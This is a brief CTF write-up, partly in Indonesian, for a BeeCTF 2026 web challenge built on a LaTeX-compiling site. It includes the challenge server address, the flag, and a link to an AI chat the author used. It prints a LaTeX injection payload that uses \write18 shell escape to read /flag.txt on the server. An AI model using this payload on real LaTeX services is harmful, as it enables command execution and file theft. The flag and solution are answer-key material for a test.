---
slug: "web-math6025-discrete-mathematics"
title: "MATH6025 - Discrete Mathematics"
competition: "BeeCTF 2026"
category: "Web"
difficulty: "Easy"
date: "2026-08-22"
updated: "2026-08-24"
summary: "\"Solve this math assigment\" Then my ai proceeds to use some weird markup language for my math assigment. I asked the ai to make me a website so that i can use this language for my future assigment. Let's hope there's no naughty highschooler that will inject my site lol Author: sierra http://103.185.52.197:6767"
tags: ["WEB EXPLOITATION","LATEX"]
status: "published"
flag: "BeeCTF{Duh_dismathlagi_dismathLagi_disssnutz_hehehehheeh_galucu_ya:(}"
attachments: []
source: "https://claritys.web.id/writeups/web-math6025-discrete-mathematics"
---

# MATH6025 - Discrete Mathematics

> "Solve this math assigment" Then my ai proceeds to use some weird markup language for my math assigment. I asked the ai to make me a website so that i can use this language for my future assigment. Let's hope there's no naughty highschooler that will inject my site lol Author: sierra http://103.185.52.197:6767

![](/assets/uploads/2a897492-32d8-4738-80cc-b13b778a5a56-screenshot_2026-08-24_13-11-05.png)

* * *

Screenshot webnya:

![](/assets/uploads/63057fe6-c68b-42ef-a52e-c0ca0e541d82-image-9.png)

Di sini ketika aku paste all source main.tex itu google web banyak ngemention LaTex.

![](/assets/uploads/f7ed4987-5b73-435a-bfdc-e3780ed6fda0-image-10.png)

Di sini aku bener bener salah, karena aku langsung ngasih snippet semua htmlnya hingga js. Tidak ngasih tau kalau dia ini LaTex. Alhasil kata probset ini nanti gak dianggap point.. tapi aku bakal jelasin sebisanya sih.

![](/assets/uploads/c45f5ea6-6439-4693-ac1d-7eb1e87ae40c-1787457035691946629.png)

Karena LaTex ini basicnya itu mirip kayak .md, jadi membutuhkan karakter special khusus biar nanti bisa memberi output yang kita harapan di dunia matematika. Jadi, kita tinggal kasih regex dikit lalu kita reconstruct flagnya sesuai format.

Aku pakai payload ini:

```
\documentclass{article}
\usepackage{verbatim}
\begin{document}
\immediate\write18{cat /flag.txt | sed 's/_/\\_/g' > /tmp/flag.txt}
\input{/tmp/flag.txt}
\end{document}
```

Yang outputnya nanti:

![](/assets/uploads/c2e7adfc-d23a-414c-84f7-9cf681a6b30d-image-11.png)Dapetnya adalah `BeeCTFDuh dismathlagi dismathLagi disssnutz hehehehheeh galucu ya:(` jika di copy, kita tinggal menambahi underscore dan kurung kurawal.

#### Link AI:

[**https://chat.deepseek.com/share/shh4y86sjh3qzk9rv1**](https://chat.deepseek.com/share/shh4y86sjh3qzk9rv1)
